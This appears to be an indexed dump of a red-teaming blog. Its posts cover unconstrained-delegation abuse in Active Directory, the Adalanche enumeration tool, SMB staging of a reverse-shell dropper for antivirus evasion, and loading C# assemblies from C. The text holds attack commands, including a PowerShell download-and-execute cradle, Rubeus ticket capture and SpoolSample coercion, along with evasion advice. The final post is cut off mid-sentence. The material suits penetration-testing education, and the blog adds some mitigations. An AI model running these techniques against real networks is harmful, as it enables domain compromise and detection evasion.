[[{"l":"Welcome"},{"l":"Red Teaming Army","p":["This is my personal blog space. The main idea of this platform is to allow me to share my knowledge in Red Teaming and Penetration Testing. Feel free to use the file navigation in order to view the present blogposts, or use the recursive search to find something specific of your needs!","I will do my best to transfer all of my videos to blogposts in order to reach more people.","The Red Teaming Army has its Discord server available here: https://discord.gg/bgSpdheEgu","Feel free to join the Discord server, where we share knowledge and experience, while debugging problems in real time!"]},{"l":"Support","p":["All of my work on this blog space is and always will be free and publicly accessible.","If you have further appreciation for my work, you can become my Patreon ( https://www.patreon.com/Lsecqt) and get access to custom tools, private notes and Know-How, and the ability to request videos or blogs on specific topic.","Or you can just buy me a coffee ( https://www.buymeacoffee.com/lsecqt)"]}],[{"l":"Unleashing the Power of Unconstrained Delegation"},{"l":"Introduction","p":["In the world of Active Directory, a lot of attacks are based on delegation misconfigurations. Depending on the context, they may allow the attacker to laterally move across the network, achieve local / domain privilege escalation or even compromise the Domain Controller (DC).","In this blog we are diving into Unconstrained Delegation.","If you prefer watching a video instead of reading, you can find my video walkthrough on the topic here: Attacking Active Directory: Unleashing the Power of Unconstrained Delegation (youtube.com)","Do not forget to join the Red Teaming Army's Discord server where we share knowledge, experience, and debug together in real time: https://discord.gg/bgSpdheEgu","Also, if you have further appreciation for my work you can become my Patreon: Lsecqt | Creating Pentesting / Red Teaming Videos | Patreon. This helps me a lot."]},{"l":"Theory"},{"i":"what-is-delegation","l":"What is Delegation?","p":["In a nutshell, delegation is the act of granting specific user / machine / service elevated rights towards other user / machine / service. Usually such privileges are granted on computers that run various services, like MSSQL / IIS or on users with bigger administrative needs.","To better understand it, let's take the following example: A user is authenticating and operating to IIS service which is connected to a MSSQL database. When the DB backend needs to be modified the IIS server connects to it on behalf of the user, thus, the IIS service or perhaps the whole machine could be entrusted for delegation.","Another example would be to entrust sysadmins or HelpDesk users to perform operational roles (create, manage and delete) for other domain users. In this case, specific tasks in the context of the Active Directory would be delegated to specific group of people."]},{"i":"what-is-unconstrained-delegation","l":"What is Unconstrained Delegation?","p":["Normally, the delegations across the Active Directory should be strictly configured. It should explicitly map the delegated user / machine to the specific services and nothing more.","Unconstrained Delegation also known as Unrestricted Delegation is characterized with that it is NOT limited to specific service, but instead it impersonates the designed user / machine with all of its access rights and permissions across the AD context. Unrestricted Delegation is designed to save the delegated user's TGT directly into the computer's memory.","For instance, if we take the previous User -> ISS -> MSSQL example, if the same scenario was replicated with configured Unconstrained Delegation, the IIS service would obtain a valid TGT for the user connecting to it.","Any authentication towards Unconstrained Delegated machine, will effectively save the incoming user's TGT into the memory of the machine. This behavior also makes UD marked machines nice targets, since they may contain a lot of valid user's TGTs."]},{"l":"Exploitation"},{"l":"Enumeration","p":["The easiest ways to enumerate Unconstrained Delegation are via:","PowerView ( https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","BloodHound ( https://github.com/BloodHoundAD/BloodHound)"]},{"l":"PowerView","p":["PowerView is powerfull tool designed for Active Directory enumeration. It has built-in modules for analyzing delegation permissions across domain users and machine accounts.","To find Unconstrained Delegation entities, it is enough to:","Import it","iex(new-object net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')","Scan for Unconstrained Delegation:","Get-DomainComputer -Unconstrained","Finding machines marked for Unconstrained Delegation","The following output reveals 2 machines that have Unrestricted Delegation enabled. This means:","Any user connecting via any service on any of the mentioned machines will have his TGT saved inside the memory of the corresponding machine.","Since both of them are marked as Unrestricted Delegation, if you have access to one of them, you could most likely laterally move to any other machine if you can coerce its authentication.","Since the TGT is automatically saved to the targeted computer via any form of authentication, we can capture the TGT for the Domain Controller by performing authentication coercion."]},{"l":"BloodHound","p":["It is also possible to find computer accounts marked for Unconstrained Delegation via BloodHound. I am not going to dive deep into how BloodHound operates, but in a nutshell:","When you import the collected data from the Active Directory into BloodHound, you can use the following option for finding accounts allowed for Unconstrained Delegation:","Finding machines marked for Unconstrained Delegation with BloodHound","By default, Unconstrained Delegation is assigned to machine accounts, but in some edged cases, you may enumerate the same delegation rights to be present on specific user accounts."]},{"i":"exploitation-1","l":"Exploitation","p":[".\\Rubeus.exe monitor /interval:10 /filteruser:dc01$",".\\SpoolSample.exe dc01 client01",".\\SpoolSample.exe Target_Server Capture_Server","Armed with the ticket we can compromise the Domain Controller or directly perform DCSync.","As mentioned before, in its core, when machine is marked for Unconstrained Delegation, any user / machine authenticating to it, via any service, will result in its TGT stored on the authentication machine.","Capturing TGT from the Domain Controller's machine account","Coercion can be triggered via various tools such as Coercer or Petitpotam, do not limit yourself with anything specific! Different tools will work in different cases.","Confirming that the dc01$ ticket is imported","For instance, in this example, we have already compromised $Client01 machine and our target is $DC01.","If we compromise a machine marked for UD, and if we somehow force authentication from other machines / users across the network, we could effectively compromise them.","In this example, we will perform coercion via SpoolSample to trigger the authentication.","Keep in mind that it is super common to encounter Unconstrained Delegation flag on Domain Controllers, since this is part of their operational work and they are by default trusted! Even if they are missing the flag, they can still be compromised if authentication coercion is possible and the compromised machine has the flag enabled!","Keep in mind that since our compromised machine Client01$ is marked for Unconstrained Delegation, by not filtering the tickets account, you can get overwhelmed. Not filtering can be extremely useful in different scenarios, but now the target is DC01$","klist","Let's start Rubeus in monitor mode:","Now if we go back and check the Rubeus process, we can observer that the TGT from the Domain Controller's machine account was successfully dumped and injected.","Rubeus has monitor mode support, which means it can effectively listen for incoming authentication and will automatically retrieve the TGT if it is stored!","Starting Rubeus in monitor mode","The next step is to either wait for any form of authentication or force it! This may vary depending from your context and objectives, for example, phishing attacks for SMB path spoofing can be implemented, tricking users to connect to the Unconstrained machines.","The syntax is fairly simple:","This command will also filter the results based on its originating account. In this case, to have a clean output, we are interested in the Domain Controller's machine account DC01$","Triggering the authentication from the DC to our capture server via SpoolSample","We can confirm that the ticket is injected by running:","Which will get translated to:","While there are various ways of executing this attack, I prefer doing it with Rubeus."]},{"l":"Conclusion","p":["Again we are faced against the calculation between scalability and security. Of course it is easier to just setup things to be relevant to all services, but this can come with huge risk. Let’s discuss how to mitigate it!","First of all is disabling Print Spooler service, especially if you do not need it! By disabling coercion you can reduce the risk and the chance for this attack. However, as mentioned before, this is not the only way of executing it, thus, by removing coercion misconfigurations, you can still get pwned!","Important note: Print Spooler is just one service / interface that can trigger authentication, there are many, many more ways to do coercion attacks. It is recommended to disable them all, unless you have practical use for them.","While this remediation technique is doing well, my most honest recommendation is to be careful when setting things up. Try to encapsulate as much as you can, this way you make the attacker’s job harder by adding hours and hours into researching in order to try more things.","Make sure to setup delegation permissions only for specific user / machine accounts and make sure they are pointing only to specific service, user or machine account. Avoid using Unrestricted Delegation, especially on machines that are not Domain Controllers.","Delegations are elegant way of optimizing the internal network mechanisms, but should be implemented with caution. Make sure to implement delegation for and to the exact assets that needs the delegation at the first place.","Hope you enjoyed and learned something new!"]}],[{"l":"Visualizing ACLs with Adalanche"},{"l":"Visualizing ACLs with Adalanche","p":["I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called Adalanche, which is capable of enumerating and visualizing ACLs between entities in the scope of the Active Directory.","Usually, Active Directory misconfigurations can be found within the ACLs, and they can often lead to obtaining domain administrative privileges by chaining various lateral movement or privilege escalation techniques together. A very simple example for that can be a vulnerable ADCS server to ESC1 attack. Another example could be finding out that the current owned user is local administrator on some machine and after data exfiltration, you find domain admin credentials.","Mapping such attack vectors can be complicated without such tools, and while you should not be dependant of them, they are here to help, and they certainly do!","While BloodHound is my rank #1 tool for enumerating and visualizing the Active Directory, I was also thrilled to try Adalanche, mainly because of curiosity in terms of UI, practical use and evasiveness. Turned out that this tool might be a hidden gem!","If you prefer watching a video instead of reading, I already deployed a video about the topic on my channel:","Also make sure to join my Discord where we share experience, knowledge and doing CTF together.","And if you have further appreciation for my work, don't hesitate to become my Patreon!"]},{"i":"why-not-just-use-bloodhound","l":"Why not just use BloodHound?","p":["Now here comes the question, why bother with Adalanche when I have BloodHound?","The answer is very simple, it is always a good idea to have alternatives for specific tools. Also, alternatives creates competition and this is a fundamental process of improving both of the sides, so its a win = win situation.","Additionally, as you might already know, SharpHound(The data collector for BloodHound) is extremely signatured by various security mechanisms. I am aware that the signatures and the behavioral detections can be bypassed but sometimes its not a trivial process. For Instance, it is possible to land into an environment that is extremely well network segmented, so that you cannot get a C2 implant to run and you should rely on some kind of workarounds such as bind shells on specific ports, which not all C2 framework actually supports. Additionally, its possible that the network is restricted in such way, that you cannot just execute the python collector. On top of that, if the segmentation is combined with enforced endpoint protection, it can become even more challenging. This just makes the things more complicated and can effectively lose a day or two into just getting the basic AD enumeration.","On the other hand, Adalanche is a tool that can work as both a collector and a visualizer at the same time, while it is extremely evasive. Imagining the previous restricted scenario, if Adalanche is execute from a compromised machine with network access to the LDAP server, it is less likely to get detected and blocked.","When operating from C2 framework, the Adalanche binary can be executed with any PE-execution module, if your C2 supports such!","[BIG DISCLAIMER] I am aware that there are always various workarounds for all scenarios. The goal of this blog is not to question them, but to discuss and analyze the Adalanche tool.","Now, let's get an idea of what Adalanche actually looks like."]},{"l":"Adalanche Overview","p":["Adalanche is go-written tool for collecting and analyzing data from Active Directory. It is capable of extracting potential attack vectors such as unconstrained delegation, ESC1, outdated servers, users with administrative privileges and more. It is extremely fast and compatible with each modern Operating System (OS).","One of the coolest features about Adalanche is that it is self-sufficient, which means, you do not need:","Database (like Neo4j)","Specific engine or runtime installed (like dotnet runtime)","Additional software (like a web server)","All you need is the compiled binary and luck that you are in a vulnerable environment. Since the Adalanche is go-written, the same code can be compiled for both windows and * nix systems.","It is always a good idea to obfuscate the code and compile it yourself. Currently (January, 2024) the tool does not get signatured but most likely this will change in the near future!","Adalanche can be run directly, with no arguments if it is launched from a domain joined windows machine. On the other hand it can also mimic bloodhound.py, scraping the LDAP from a machine with network access to the Domain Controller. It then stores the gathered data into a folder called data, which can be analyzed in the future. Now let's analyze the different methods on how to get it running!"]},{"i":"case-1-i-am-operating-from-a-domain-joined-windows-computer","l":"Case 1: I am operating from a domain joined Windows computer","p":["Adalanche is capable of detecting the context of the current user. In case you are operating from a domain joined machine, and from the context of a domain user, you do not need to supply any arguments! In this scenario it is enough to just download and execute the binary.","This will perform all the scraping automatically, then Adalanche will automatically analyze the collected data and finally, it will host the results on 127.0.0.1:8080 while navigating your default browser to the web view.","If everything went smooth, you should see something like this:","Entry screen of adalanche"]},{"i":"case-2-i-am-operating-from-a-host-with-vpn-access-and-ad-credentials","l":"Case 2: I am operating from a host with VPN access and AD credentials","p":["Adalanche is also capable of scanning and extracting data from the Active Directory remotely. In this scenario, it is required to have network visibility to the LDAP servers as well as a valid pair of credentials for the Active Directory.","The Adalanche binary can now be used in 2 modes:","collect","analyze","The first mode will perform the data collection via querying the LDAP service. After completion, again, all of the results will be stored in a folder called data unless you specify something different. All of the needed options can be found on the docs or by running:","By following the options, this exemplary command can collect the data from the Active Directory:","After this command finishes, the data folder will be present in your current working directory.","Since all of the collected AD information is stored into that data folder, you can also zip and ship it somewhere else. Keep in mind that the dump can be analyzed offline as soon as the Adalanche binary is present. As already mentioned, the same binary can be used for both collection and analyzing the data.","When you are ready to analyze the results and generate a web view, you can do so by running:","If everything is running as expected, you should again see the initial screen of Adalanche: Entry screen of adalanche"]},{"l":"Adalanche Usage","p":["Adalanche comes with the following predefined LDAP queries for visualizing nodes and searching for attack paths:","Adalanche UI is divided into 3 parts:","Adalanche visual options","Additionally, the options Set as route target and Route to target can be used to effectively display the attack path:","Additionally, the orange links most of the times mean that the object is a member of specific group, while the white usually means that there is some form of connection between objects which is not dangerous or exploitable.","Additionally, the Start Query, Middle Query and End Query are query separators, which means, that you can implement your own custom nested queries for finding various attack paths, misconfigurations and vulnerabilities.","Ann Rogers has AllExtendedRights permissions over SQL02 machine","Builtin LDAP queries","By following the same logic, we can understand that the SQL02 is marked for Unconstrained Delegation, because its node is bigger and marked in red, compared to other machine accounts in the graph:","Compared to BloodHound, Adalanche is not using any database engines for storing the results. It is based entirely on LDAP to perform any visualization and analysis over the collected data (which is purely stored on the local file system). To visualize the results, Adalanche uses web view, which can be configured with the option --bind 'IP:PORT'.","Cons","Exact query match in red, in this case SQL02 is allowed for Unconstrained Delegation","Extremely easy to lose the data","Extremely easy to migrate and share","From these, you may notice that a lot of the queries are actually familiar from BloodHound (such as Kerberoastable users, DC Sync users and so on).","However, various objects can effectively influence and control emma: Results from Who can pwn this node? query","In this scenario, our user emma does not have direct dangerous and abusable ACLs toward any object in the domain. Results from What can this node pwn? query","It is in the LDAP querying tool where it gets interesting.","LDAP query section","LDAP querying tool centered on the bottom.","Lets analyze the above executed query: ((type=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!userAccountControl:1.2.840.113556.1.4.803:=8192)) which is designed to show all computers which are marked for Unconstrained Delegation, and are not Domain Controllers. While at first the output can be a little messy, it makes sense when you start reading the lines.","No collector / db engine version incompatibility","No dependencies other then the Adalanche binary","No Internet Explorer support, wont run smooth on old machines","Nodes visualization settings on the right","Object explorer","Object explorer on the left","Of course, one negative aspect would be that you need to be doing good with LDAP in order to implement anything custom and to get the most out of Adalanche, but on the other hand, I found out that the default queries are working pretty nice. While I find the output from some of them confusing, others like Who can change GPOs, ESC1 vulnerable certificate templates and Who can dump SAM/SYSTEM can be extremely easy to understand and useful.","On the Object explorer you can observe and analyze various objects, including present users, their groups, machines, Active Directory configurations and more.","On the right, you can tweak how the Adalanche should look like, but I personally did not spend much time on it since I was happy with the defaults.","One of the coolest parts about Adalanche, is that when you execute one of the queries, you get its raw syntax inside the LDAP querying section, from where you can modify and update the query to suit your needs.","Other features such as what can this node pwn and what can pwn this node I found to be extremely useful and practical. These options can be utilized into setting up a target or a starting point.","Pros","Query showing Unconstrained Delegation non-DC machines","Querying the user emma, visualizing all objects that can directly influence her.","Results from setting emma as a target and running Route to target from Enterprise Admins group node","Similar to BloodHound, when you click on the paths between objects, you can get additional details about various attributes and relationships. It is not as informative as BloodHound(the path does not give exploitation guides), but still can be quite useful when you are already aware of the most common AD attacks. For example, when you see a red link between nodes, Adalanche claims that there are dangerous permissions between them.","Storing files on the local FS can lead to super easy signatures","The data from the object explorer is the raw data from the LDAP server. Here you can find the values in various object fields, such as object description","The whole idea of these options is to find attack paths to or from specific objects.","This behavior has its pros and cons such as :","User admin is a member of the Administrators group, visualized with orange link","With that, Adalanche has everything needed to find misconfigurations and vulnerabilities in the scope of the Active Directory. I know that there are a lot of features that are missing, compared to BloodHound, but still the essentials are here. One of the features I think Adalanche is lacking, is the exploitation docs on the node paths. Additionally, I found Adalanche hard to navigate and analyze specific single objects. Compared to BloodHound, where you can just type the object into the search box, here you would need to use LDAP queries. For example, in order to find a specific user, you can use the following LDAP query: ((objectCategory=person)(objectClass=user)(sAMAccountName=username))"]},{"l":"Conclusion","p":["Now it is your turn to try out the tool and decide for yourself if it is worth it or not! In my opinion, compared to BloodHound, Adalanche is worst at visuals but still can present useful information and real attack paths.","While it can be initially confusing I think it is a great alternative which has its own pros and cons. I personally find the architecture pretty amazing and well done! The ability to be that flexible and evasive is something that must be credited, and we also need to acknowledge that the project is actively being developed and supported!","Metadefender scan results","I highly encourage you to try it out on your own and decide whether it is useful in your cases."]}],[{"l":"Beyond Detection SMB Staging for Antivirus Evasion"},{"l":"Introduction","p":["In the ongoing cat-and-mouse game between cyber attackers and defenders, the battleground has shifted from traditional malware tactics to more sophisticated methods of infiltration. One such technique gaining traction is SMB (Server Message Block) staging, a maneuver that allows attackers to bypass antivirus software and gain unauthorized access to systems. In this article, we delve into the intricate world of malware development, exploring some staging mechanics.","Before diving deeper into this topic, make sure to join my Discord where we share experience, knowledge and doing CTFs together.","If you have further appreciation for my work, don't hesitate to become my Patreon!"]},{"i":"what-is-staging","l":"What is staging?","p":["Staging, entails a technique to dynamically fetch the malicious payload during runtime. Unlike conventional methods where the entire malicious code is delivered at once, staging involves a two(or more) step process. Initially, a small and innocuous piece of code, often referred to as the stager, is deployed onto the target system. Subsequently, this stager communicates with a remote server controlled by the attacker to retrieve the actual malicious payload.","This tactic serves a dual purpose: evasion and flexability. By implementing shellcode runner that dynamically fetch its payload during runtime, you first achieve more evasiveness, because the AV/EDR system is having extremely hard time to predict what the dropper is trying or going to do. Secondly, this provides extreme levels of flexability, by swapping the remote payload, the same dropper can be reused for any need. By dividing the attack into multiple stages, it minimizes the footprint of the initial intrusion, making it more challenging for security systems to identify and block malicious activity.","Let's visualize it:","Staging payload execution from https://blog.spookysec.net/stage-v-stageless-1/","Generally, there are various ways (a.k.a protocols) to stage a payload, such as:","HTTP/S","FTP","SMB","SSH","DNS and more","While the implementation will differ based on the protocol, the goal would be the same - to fetch the payload during runtime and execute it.","I already did a video about staging over HTTP/S","As well as staging over SMB","So if you prefer watching a video instead of reading, feel welcomed to my channel."]},{"l":"Understanding SMB","p":["I am sure that the most of you are already pretty famililar with SMB, but I feel the need to explain it here with simple terms.","SMB, standing for Server Message Block, is a network communication protocol that facilitates shared access to files, printers, and various resources within a networked environment. Think of it as the digital courier that shuttles data between devices, allowing them to interact and collaborate seamlessly. Whether you're accessing a file stored on a server, printing a document from your laptop, or sharing data between colleagues, chances are SMB is working behind the scenes to make it happen.","At its core, SMB enables a client device, such as a computer or printer, to request services from a server program located on another device within the network. These services can range from file operations, such as reading, writing, and deleting files, to more complex tasks like accessing shared directories and managing network resources. While SMB is protocol which can be used in pretty much any environment, it lies at the heart of Windows networking.","In Windows operating systems, SMB is deeply integrated into the networking stack, providing essential functionality for file and print services. By default, Windows client operating systems, such as Windows 10, and server operating systems, such as Windows Server 2019, include both SMB client and server components.","SMB Client: The SMB client component enables Windows devices to access shared resources hosted on remote servers. When a user accesses a shared folder or printer, the SMB client initiates a connection to the remote server using the SMB protocol, facilitating file and print operations.","SMB Server: Similarly, Windows server operating systems include the SMB server component, allowing them to host shared resources accessible to client devices on the network. Administrators can configure shared folders, set permissions, and manage access control using the built-in SMB server functionality.","With that being said, since the SMB protocol is mainly designed to share files, and its builtin in any modern Windows OS, why not simply use it for staging?","While it sounds all fun and good, there is a caveat, if an environment is properly configured, any outgoing SMB traffic would be completely disabled. This conditions our technique to be suitable for mostly internal penetration tests.","It is sometimes possible to find outgoing SMB traffic enabled, so don't forget to test for that."]},{"l":"Preparation"},{"l":"Server side","p":["Before writing the actual dropper, we must first prepare the server side and answer the following questions:","Shall I go for full SMB or just the staging part?","Based on the previous answer, which C2 framework to use?","Answering these questions is important, as this can be the difference between getting detected or not. There are C2 frameworks like Mythic, which supports various communication methods, such as SMB, or even Discord. So based on your need, setup your C2 framework, generate a payload and host it on SMB via impacket:","Hosting the current working directory","Running this command will create SMB server and all of the files inside the hosted directory can be now accessed from a remote host.","Accessing the shared folder via file explorer"]},{"l":"Dropper","p":["After following the docs, I was able to come up with something like this:","As a language of choice I decided to go for C, mainly because of:","At first, the CreateFileA API looked strange to me, because the name is counter intuitive. I want to open a file not write to one. However, this function can be used to obtain a valid handle to a file, when parameters are carefully crafted.","CreateFileA","Easy Win32APIs integration","For our case we need to invoke the following Win32 APIs","Generally more evasive language","In that case, since we already have a handle to a file, the invocation is as simple as specifying the handle, the address of the variable we want the payload to be in, and of course, the size.","In this case, the fileName is just a string variable, but the interesting thing is that you can pass a valid SMB path to a file.","Invoked like that, all of the parameters are designed to specifically open a handle to a file in read mode!","Let's observer the function signature:","Now after we have a handle to a file, we need to read it into a variable, right? Let's invoke ReadFile API.","ReadFile","SMB Staging is already implemented in my ShadowBurn packer. By supporting my work on Patreon, you can get access to it as well as other useful repos.","The idea of the dropper would be extremely simple, read a .bin file from a remote file share into a variable. Then allocate the needed memory and execute it with a standard procedures such as Direct Pointer. More on what Direct Pointer is and how it works you can find here.","Then we need to add the execution flow as described in the Direct Pointer blog, and then after combining the pieces we would have something like this:","VirtualAlloc"]},{"l":"Execution","p":["At this point on, you should have your payload and SMB server ready. Keep in mind that I have designed the dropper to operate with windows/x64/shell_reverse_tcp payload from msfvenom, but make sure to adjust the code if your payload differs.","It can also be a good idea to replace the statically allocated buffer variable with dynamic reallocation procedure, enjoy your homework task.","Now, after everything is setup, and after executing the dropper on the targeted system, we can first observe that the NTLMv2 hash of the local user is stolen, which means that the client successfully connected to the setup share.","NTLMv2 hash intercepted","And with that, the reverse shell is captured, which means that the remote file was successfully read to the local memory and executed. Captured reverse shell"]},{"l":"Evasion key notes","p":["In the current configuration, scanning it with engines such as AntiScan.me would present incredibly good result, mainly because of signature detection.","Metadefender scan output","Since no payload is present into the dropper, signature detection fails to find something malicious. However, this does NOT mean that the dropper is that evasive. Keep in mind that memory scanners and heuristic based detection can not be tested from antiscan.me or others.","A nice alternative to AntiScan.me is https://metadefender.opswat.com/","For that reason, the only valid way to test the payload would be to execute it from a system with the targeted engine. I have developed a simple application that allows you to scan and execute files against Windows Defender.","I attended BSides 2024 - Sofia, Bulgaria and did a workshop together with cocomelonc. You can access the workshop materials from here: https://github.com/lsecqt/BSides-2024-Malware-Development-101-From-Zero-to-Non-Hero and setup the custom scanner application.","It is a flask based application that uses AVred to utilize AMSI and scan a file.","Scanner application web UI","In order to start the application, you can follow the readme instructions on the repository.","The application is designed to not only scan a file, but to execute it if no threats are found. Uploading our dropper, resulted in successful (for us) result and another shell was obtained.","Defender found no threat","Obtaining shell after the scanner executed the dropper","Keep in mind that the results can be different for different vendors. The scanner applications works only with Windows Defender."]},{"l":"Conclusion","p":["Staging is one of my favorite techniques when it comes to malware development. I know that the most important aspect of it is the evasiveness, but also do not underestimate the flexibility. Now, do not get me wrong, even though this technique is extremely cool, it is simply not enough by itself. Just by staging a payload does not mean that you would get it to run everywhere. The evasiveness depends on many many factors and it is rather a combination of techniques bundled together against a predefined target. Sometimes payload that get past Defender, will never get past other engines. It is a process of constant trial and error, but in general, by hiding the payload into unknown to the AV/EDR place, you can achieve great results."]}],[{"l":"Executing CSharp Assemblies from C code"},{"l":"Introduction","p":["The integration of native C code with managed C# assemblies opens up a realm of possibilities, allowing malware developers to leverage the strengths of both worlds within a single application. Most of the modern C2 frameworks have the option for executing C# assemblies, no matter on which language they are built upon. I know it is a feature we all desire but have you ever wondered, how it works on the bottom level? How it is possible to invoke an assembly from a language like C?","At its core is the Common Language Runtime (CLR), a vital component of the .NET framework.","The magic begins with the compilation process. The native C code is typically compiled into machine code specific to the target architecture, while the C# code is compiled into an intermediate language called Common Intermediate Language (CIL). This intermediate language serves as a bridge between different languages and platforms.","During runtime, when your application is in action, the CLR comes into play. It takes the CIL from the managed C# assemblies and Just-In-Time (JIT) compiles it into machine code that can be executed by the underlying hardware. This JIT compilation ensures that the C# code is optimized for the specific environment it's running on.","Before diving deeper into this topic, make sure to join my Discord where we share experience, knowledge and doing CTF together.","If you have further appreciation for my work, don't hesitate to become my Patreon!"]},{"i":"what-is-clr","l":"What is CLR?","p":["The Common Language Runtime (CLR) stands as a foundational element within the Microsoft .NET framework, playing a crucial role in the execution of .NET applications. It creates a versatile runtime environment, allowing developers to code in various languages such as C#, VB.NET, and F#. This multilingual support is made possible by compiling code into a common intermediate language (CIL or IL), which CLR then translates into native machine code during runtime.","One of CLR's notable features is its management of memory. It ensures efficient memory allocation and deallocation, mitigating the risk of memory leaks and enhancing overall program reliability.","CLR also incorporates Just-In-Time Compilation (JIT), dynamically compiling IL code into native machine code at runtime. This adaptive process optimizes performance by tailoring the code to the specific characteristics of the underlying hardware.","The Common Language Runtime (CLR) is an integral part of the Windows operating system, making it available by default. This inclusion in the Windows environment streamlines the development process for .NET applications, as developers can leverage CLR's features without the need for additional installations.","The .net runtime version that comes by default with Windows 10 OS is v4.0.30319"]},{"i":"loading-assemblies-from-c","l":"Loading Assemblies from C#","p":["Loading assemblies from C# is a trivial process mainly because the CLR is already present in the memory of the parent process. The most easy way to load C# assembly from another C# program is by using Assembly.Load method.","The Assembly.Load method is part of the System.Reflection namespace and allows you to load an assembly by providing its name or path. There are a few overloads of this method, but a common one takes a string parameter representing the name of the assembly to load.","The assemblyString parameter can be the full name of the assembly, which includes the assembly's simple name, version, culture, and public key token.","Another key component we need to discuss is AppDomain. In C#, an AppDomain(Application Domain) is a lightweight, isolated, and self-contained environment within a process where .NET applications run. It provides a way to isolate and unload applications independently within a single process. By default, each C# application operates under at least 1 AppDomain. In most cases, for simple applications, you don't explicitly interact with the default AppDomain because it is automatically created for you. However, in more complex scenarios or when dealing with advanced features like application domain isolation and unloading, you might create additional AppDomains.","Let's say you have a scenario where the assembly name is known and it is in the same working directory as the custom loader below. Here is basic example of loading Rubeus, which is in the same directory.","After compilation and execution, we can indeed observe that the Rubeus.exe is executed.","Executing Rubeus from custom C# application","Additionally, if we observe the process with ProcessHacker2, the Rubeus.exe will be present in the loaded modules:","Loaded DLLs, viewed from Process Hacker 2"]},{"l":"Loading Assemblies with C"},{"i":"what-is-the-problem","l":"What is the problem?","p":["While loading and executing assemblies is easy in C#, we should not be dependant of the language and its pros and cons.","Executing C# assemblies with C can be a bit tricky due to the differences in how these languages work and the runtime environments they rely on.","Firstly, C# is designed to run on the .NET framework, which provides a managed runtime environment. This means that C# code is compiled into an intermediate language (IL) that is executed by the Common Language Runtime (CLR). On the other hand, C is a low-level language that doesn't have built-in support for the features provided by the .NET framework.","One major challenge is that C doesn't have a built-in understanding of the .NET runtime and its features, such as garbage collection, type safety, and reflection. C# relies heavily on these features for its execution, and trying to replicate them in C can be quite complex and error-prone.","Additionally, C# assemblies are typically packaged with metadata and other information that the CLR uses for execution. Replicating this functionality in C would require a deep understanding of the .NET runtime internals, which is a complex task.","Another issue is that C# code often relies on libraries and dependencies that are part of the .NET framework. These libraries may not have direct equivalents in C, making it challenging to provide the same functionality."]},{"i":"the-solution","l":"The Solution?","p":["\"If you want to be able to bind both languages you should use ICLRRuntimeHost::SetHostControl and create your own implementation of IHostControl that exposes an interface that can be used in managed code, create a managed AppDomainManager that also implements such interface, then obtain the ICLRControl and set the AppDomainManager managed to back your unmanaged interface. Theres a tutorial you can follow here: https://www.mode19.net/posts/clrhostingright/","Additionally, as stated in this nice reference,","After executing the code against the modified Rubeus.exe, we can confirm that it is successfully executed.","Asktgt module invoked from successfully passing the arguments","Executing C# assemblies from C involves a process called hosting. The idea is to create a host application in C that loads the CLR and runs the C# assembly.","Having confirmed compatibility and loadability, the code fetches the ICLRRuntimeHost interface, enabling direct interaction with the CLR runtime.","Having that in mind, if you want to execute a C# assembly like Rubeus, one of the options can be adding such method that will forward the execution flow to the Main method.","Here, paths and names are specified for the C# assembly, type, method, and parameters.","However, even though its possible to invoke C# assemblies from C-like languages, there is a specific limitation. As mentioned before, each and every C# application operates under at least 1 AppDomain which is created and present by default. In order for our C program to execute an assembly, the AppDomain must be explicitly accessed, since its not there by default. After accessing the AppDomain, we face another limitation. In order for a method to get called from ExecuteInDefaultAppDomain, it must inherit the following signature:","In the preamble, necessary headers are included. mscoree.h, windows.h, metahost.h, and corerror.h provide declarations and definitions required for interacting with the Common Language Runtime (CLR) and handling errors. Additionally, #pragma comment(lib, mscoree.lib) directs the linker to include the mscoree.lib library, essential for linking against the CLR.","Just throwing an idea Another approach would be to implement a loader or a packer that in runtime forwards the execution to the desired assembly / method.","Keeping the things simple for this demo, the following POC can be used to seamlessly execute C# assemblies, as soon as they have a method with the above signature:","Lets analyze the code more in depth:","Once the CLR is hosted, the next step is loading the C# assembly. Functions like Assembly.Load or Assembly.LoadFrom facilitate this process, allowing the C program to bring the compiled C# code into the CLR environment. The CLR's just-in-time compilation then translates the Intermediate Language (IL) code into native machine code. Loading the CLR empowers the C program to interact with the C# code flexibly, adapting to the dynamic nature of the managed environment.","The cleanup phase involves stopping the CLR runtime and releasing the acquired resources in the reverse order of acquisition.","The code queries the MetaHost for information about the desired CLR version (\"v4.0.30319\"). This version is a nice choice since it is shipped by default in each Windows 10. The obtained ICLRRuntimeInfo interface is stored in pRuntimeInfo. If unsuccessful, the previously acquired resources are released, and the program exits with an error code.","The ExecuteInDefaultAppDomain method triggers the execution of the specified C# assembly within the default application domain. The result is stored in dwRet. If successful (result code is S_OK), \"OKAY\" is printed to the console just for a dummy result check syntax.","The IsLoadable method checks if the specified runtime version is loadable. If not, resources are released, and the program exits with an error code.","The main function serves as the entry point of the program. Here, we declare pointers to the ICLRMetaHost, ICLRRuntimeInfo, and ICLRRuntimeHost interfaces, which are crucial for CLR interaction.","The Start method initiates the CLR runtime within the current process.","The type of the assembly does not matter, if the method signature is present, both .exe and .dll can be executed with the same technique on the POC code.","This involves initializing the CLR using functions such as CorBindToRuntimeEx or CLRCreateInstance. The CLR becomes the bridge, providing the necessary runtime environment for managed C# code.","This line initializes the CLR MetaHost by calling CLRCreateInstance with the CLSID_CLRMetaHost identifier and obtaining the ICLRMetaHost interface. If the operation fails, the program exits with an error code.","This may sound a bit complicated but it works. If youre just looking to comunicate between managed and unmanaged code, check out UnamanagedExports nuget package, wich allows you to generate native dll libraries from managed code, wich lowers the complexity of this process by a magnitude.\""]},{"l":"Conclusion","p":["While this code is far from practical and advanced, I believe it can still give you an idea of what is the process of executing assemblies from a low level language like C.","I believe that having the ability to be flexible on the programming languages is a crucial skill for every malware developer. Being able to trigger or execute managed code from any environment can help you with both enumeration and exploitation during engagements.","I am not aware of how other low level languages are treating the CLR, but my bet is that it always has to be explicitly loaded.","Thank you so much for you time, and I hope you learned something new!"]}],[{"l":"Leveraging the Direct Pointer A Stealthy Maneuver in Evasion Tactics"},{"l":"Introduction","p":["In the ever-evolving landscape of cybersecurity, evasion techniques play a critical role in circumventing the watchful eyes of antivirus (AV) and endpoint detection and response (EDR) systems. Nowadays it is crucial to have at least a grasp on the malware development world, since without it, you will have huge problems during internal penetration testing (I will not even touch on red teamings here).","Currently, with mediocre endpoint protection settings, running useful tools such as Rubeus, Certify or 